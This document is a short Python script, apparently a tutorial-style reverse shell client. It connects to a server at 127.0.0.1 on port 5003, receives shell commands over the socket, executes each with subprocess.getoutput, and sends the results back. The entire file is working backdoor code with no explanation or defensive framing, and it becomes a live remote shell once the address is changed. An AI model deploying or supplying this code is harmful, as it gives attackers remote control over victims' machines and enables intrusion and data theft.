import socket
import subprocess

server_host="127.0.0.1"
server_port=5003
buffer_size=1024

s=socket.socket()
s.connect((server_host,server_port))

#receive message from the server
message=s.recv(buffer_size).decode()
print("server:",message)

while True:
    #Recieve cmd from server
    cmd=s.recv(buffer_size).decode()
    if cmd.lower()=="exit":
        break
    #execute the cmd and retreive the results
    output=subprocess.getoutput(cmd)
    #sending output to the server
    s.send(output.encode())
s.close()
